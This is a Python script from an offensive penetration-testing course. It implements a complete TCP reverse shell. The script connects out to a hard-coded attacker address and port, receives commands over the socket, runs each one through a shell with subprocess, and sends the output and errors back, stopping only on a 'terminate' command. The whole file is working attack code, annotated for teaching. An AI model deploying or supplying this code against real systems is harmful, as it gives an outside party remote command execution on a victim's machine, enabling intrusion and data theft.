# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


import socket    # For Building TCP Connection
import subprocess # To start the shell in the system

def connect():
    s = socket.socket()
    s.connect(('192.168.1.106', 8080)) # Here we define the Attacker IP and the listening port

    while True:
        command = s.recv(102400) # keep receiving commands from the Kali machine, read the first KB of the tcp socket
        
        if 'terminate' in command.decode(): # if we got termiante order from the attacker, close the socket and break the loop
            s.close()
            break
        else:   # otherwise, we pass the received command to a shell process
            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            s.send(CMD.stdout.read()) # send back the result
            s.send(CMD.stderr.read()) # send back the error -if any-, such as syntax error

def main():
    connect()
main()
